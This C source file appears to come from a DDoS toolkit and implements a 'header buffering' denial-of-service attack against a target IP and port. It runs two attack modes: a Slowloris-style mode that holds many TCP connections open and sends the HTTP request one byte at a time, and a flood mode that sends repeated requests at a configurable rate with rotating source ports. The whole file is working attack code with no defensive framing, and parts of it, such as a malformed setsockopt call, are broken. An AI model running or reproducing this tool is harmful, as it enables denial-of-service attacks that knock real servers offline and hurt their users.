#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/make_tcp.h"
#include "../base/receiver.h"
#include "../ddos/header_buffering.h"

unsigned int headbuffer_total;
unsigned int headbuffer_produced;
unsigned int headbuffer_received;

unsigned int headbuffer_per_second;
unsigned int headbuffer_duration;
double headbuffer_elapsed_time;

char *headbuffer_dest_ip;
char *headbuffer_src_ip;
int headbuffer_src_port;
int headbuffer_dest_port;

int headbuffer_generated_count;
short headbuffer_timed_finisher;

clock_t headbuffer_global_time;
clock_t headbuffer_global_elapsed_time;

pthread_mutex_t headbuffer_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t headbuffer_cond = PTHREAD_COND_INITIALIZER;

char headbuffer_request[__HEADER_BUFFERING_REQUEST_MSG_SIZE__ ];

int *headbuffer_sockets;
unsigned int headbuffer_wait_duration = 1.0;
clock_t *headbuffer_clocks;
unsigned int headbuffer_current;
int *headbuffer_http_cursor;

int debug_log = 0;

void header_buffering_print_usage(int mode) {

	if (mode == 1)
		printf(
				"header buffering Usage : [Src-IP] [Dest-IP] [# thread] [# attacks(0 for INF)] [Src-Port] [Dest-Port] \n");
}

void* generate_header_buffering1(void *data) {
	int thread_id = *((int*) data);
	clock_t thread_clock;

	while (1) {

		pthread_mutex_lock(&headbuffer_mutex);
		thread_clock = clock();

		//printf("Log[%d] : T<%d>, S<%d>\n", debug_log++, headbuffer_current,
		//	headbuffer_sockets[headbuffer_current]);

		//making tcp connection
		if (headbuffer_sockets[headbuffer_current] == -2) {

			headbuffer_sockets[headbuffer_current] = socket(AF_INET,
					SOCK_STREAM, 0);

			int sdbf = 2;

			if((headbuffer_sockets[headbuffer_current],SOL_SOCKET,SO_SNDBUF,(const char*)&sdbf, sizeof(sdbf))==-1)
						perror("setsockopt failure.\n");

			if (headbuffer_sockets[headbuffer_current] == -1)
				perror("sock creation failed\n");

			struct sockaddr_in servaddr;
			servaddr.sin_family = AF_INET;
			servaddr.sin_addr.s_addr = inet_addr(headbuffer_dest_ip);
			servaddr.sin_port = htons(headbuffer_dest_port);

			if (connect(headbuffer_sockets[headbuffer_current],
					(struct sockaddr*) &servaddr, sizeof(servaddr)) != 0)
				perror("connect failed\n");

			headbuffer_src_port++;
			printf("sock value : %d\n", headbuffer_sockets[headbuffer_current]);
			if (headbuffer_src_port >= 65000)
				headbuffer_src_port = 10000;
		}

		double elapsed = ((double) (thread_clock
				- headbuffer_clocks[headbuffer_current])) / CLOCKS_PER_SEC;

		if (elapsed < 1.0) {
			pthread_cond_wait(&headbuffer_cond, &headbuffer_mutex);
		}

		int sent_size = -1;

		if (headbuffer_sockets[headbuffer_current] >= 0) {
			sent_size = write(headbuffer_sockets[headbuffer_current],
					headbuffer_request
							+ headbuffer_http_cursor[headbuffer_current], 1);

			printf("Sending From Socket[%d], wish:<%c>, sent size : %d\n",
					headbuffer_sockets[headbuffer_current], *(headbuffer_request
					+ headbuffer_http_cursor[headbuffer_current]),sent_size);

			headbuffer_clocks[headbuffer_current] = clock();

			headbuffer_http_cursor[headbuffer_current] += 1;

			if (headbuffer_http_cursor[headbuffer_current]
					>= __HEADER_BUFFERING_REQUEST_MSG_SIZE__) {
				close(headbuffer_sockets[headbuffer_current]);
				headbuffer_sockets[headbuffer_current] = -1;
			}
			headbuffer_current++;
		}

		if (headbuffer_current >= headbuffer_total) {
			headbuffer_current = 0;
		}

		pthread_cond_signal(&headbuffer_cond);
		pthread_mutex_unlock(&headbuffer_mutex);
	}

	return 0;

}

void* generate_header_buffering2(void *data) {
	int thread_id = *((int*) data);
	clock_t thread_clock;

	int sock;
	while (1) {

		pthread_mutex_lock(&headbuffer_mutex);
		thread_clock = clock();
		headbuffer_elapsed_time = ((double) (thread_clock
				- headbuffer_global_elapsed_time)) / CLOCKS_PER_SEC;

		if (headbuffer_elapsed_time >= headbuffer_duration) {
			pthread_mutex_unlock(&headbuffer_mutex);
			pthread_cond_broadcast(&headbuffer_cond);
			headbuffer_timed_finisher = 1;
			return 0;
		}

		if (headbuffer_produced >= headbuffer_per_second) {
			pthread_cond_wait(&headbuffer_cond, &headbuffer_mutex);
		}

		int sock = tcp_make_connection(inet_addr(headbuffer_src_ip),
				inet_addr(headbuffer_dest_ip), headbuffer_src_port,
				headbuffer_dest_port, SOCK_PACKET);
		headbuffer_src_port++;
		if (headbuffer_src_port >= 65000)
			headbuffer_src_port = 10000;

		send(sock, headbuffer_request, __HEADER_BUFFERING_REQUEST_MSG_SIZE__,
				0);

		headbuffer_produced++;
		headbuffer_total++;
		headbuffer_generated_count++;

		pthread_cond_signal(&headbuffer_cond);
		close(sock);
		pthread_mutex_unlock(&headbuffer_mutex);

	}

	return 0;
}

void* headbuffer_time_check(void *data) {
	int thread_id = *((int*) data);
	clock_t t1;
	t1 = clock();
	headbuffer_global_elapsed_time = clock();
	double time_taken;

	while (1) {
		pthread_mutex_lock(&headbuffer_mutex);

		headbuffer_global_time = clock();
		headbuffer_elapsed_time = ((double) (headbuffer_global_time
				- headbuffer_global_elapsed_time)) / CLOCKS_PER_SEC;
		if (headbuffer_timed_finisher == 1)
			return 0;
		time_taken = ((double) (headbuffer_global_time - t1)) / CLOCKS_PER_SEC;

		if (time_taken >= 1.0) {
			headbuffer_produced = 0;
			t1 = clock();
			time_taken = 0;
			pthread_cond_signal(&headbuffer_cond);
		}
		pthread_mutex_unlock(&headbuffer_mutex);
	}
}

void header_buffering_run(char *argv[], int mode) {

	//will be implemented later... ##############
	/*FILE *get_f;

	 get_f = fopen("./src/ddos/http_request.txt", "rb");
	 if (get_f == NULL) {
	 perror("open error! does http_get_request.txt exist?\n");
	 exit(1);
	 }
	 char buffer[__HEADER_BUFFERING_REQUEST_MSG_SIZE__ ];
	 while (fgets(buffer, __HEADER_BUFFERING_REQUEST_MSG_SIZE__, get_f) != NULL) {
	 strcat(headbuffer_request, buffer);
	 strcat(headbuffer_request, "\r\n");
	 }
	 strcat(headbuffer_request, "\r\n");
	 fclose(get_f);
	 */
	strcpy(headbuffer_request, "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");

	printf("HTTP header msg:\n%s\n", headbuffer_request);

	headbuffer_src_ip = (char*) malloc(sizeof(char) * 20);
	headbuffer_dest_ip = (char*) malloc(sizeof(char) * 20);
	int argc = 0;
	headbuffer_generated_count = 0;
	headbuffer_timed_finisher = 0;
	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 1 && argc != 6) {
		header_buffering_print_usage(mode);
		return;
	} else if (mode == 2 && argc != 7) {
		header_buffering_print_usage(mode);
		return;
	}

	strcpy(headbuffer_src_ip, argv[0]);

	headbuffer_produced = 0;
	if (mode == 1) {
		headbuffer_total = atoi(argv[3]);
		headbuffer_src_port = atoi(argv[4]);

		//socket preparation & clock preparation
		headbuffer_sockets = (int*) malloc(sizeof(int) * headbuffer_total);

		headbuffer_clocks = (clock_t*) malloc(
				sizeof(clock_t) * headbuffer_total);
		headbuffer_http_cursor = (int*) malloc(sizeof(int) * headbuffer_total);

		headbuffer_current = 0;

		int tmp;
		for (tmp = 0; tmp < headbuffer_total; tmp++) {
			headbuffer_sockets[tmp] = -2;
			headbuffer_clocks[tmp] = clock();
			headbuffer_http_cursor[tmp] = 0;
		}

		headbuffer_dest_port = atoi(argv[5]);

		if (headbuffer_total == 0)
			headbuffer_total = __UINT_MAXIMUM__;

	}

	if (mode == 2) {
		headbuffer_total = 0;
		headbuffer_per_second = atoi(argv[3]);
		headbuffer_duration = atoi(argv[4]);
		if (headbuffer_duration == 0)
			headbuffer_duration = __UINT_MAXIMUM__;

		if (headbuffer_per_second == 0)
			headbuffer_per_second = __UINT_MAXIMUM__;

		headbuffer_src_port = atoi(argv[5]);
		headbuffer_dest_port = atoi(argv[6]);
	}

	int num_threads = atoi(argv[2]);

	headbuffer_dest_ip = argv[1];
	strcpy(headbuffer_dest_ip, argv[1]);

	int *generate_thread_id, *receive_thread_id;
	pthread_t *generate_thread, *receive_thread;
	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));

	int i;

	printf("Header Buffering attack to %s using %d threads\n",
			headbuffer_dest_ip, num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	for (i = 0; i < num_threads; i++) {
		if (mode == 1)
			pthread_create(&generate_thread[i], NULL,
					generate_header_buffering1, (void*) &generate_thread_id[i]);
		if (mode == 2) {
			printf("thread %d created\n", i);
			pthread_create(&generate_thread[i], NULL,
					generate_header_buffering2, (void*) &generate_thread_id[i]);
			/*RECEIVE THREAD DEACTIVATION*/
			//pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
		}

	}

	pthread_create(&generate_thread[i], NULL, headbuffer_time_check,
			(void*) &generate_thread_id[i]);
	num_threads++;

	for (i = 0; i < num_threads; i++) {
		void *status1, *status2;
		pthread_join(generate_thread[i], &status1);
		/*RECEIVE THREAD DEACTIVATION*/
		//pthread_join(receive_thread[i],&status2);
		printf("threads %d joined\n", i);
	}

	printf("Header Buffering attack finished.\n");

	pthread_mutex_destroy(&headbuffer_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);
	free(headbuffer_src_ip);
	free(headbuffer_dest_ip);
	free(headbuffer_sockets);
	free(headbuffer_clocks);
	return;
}
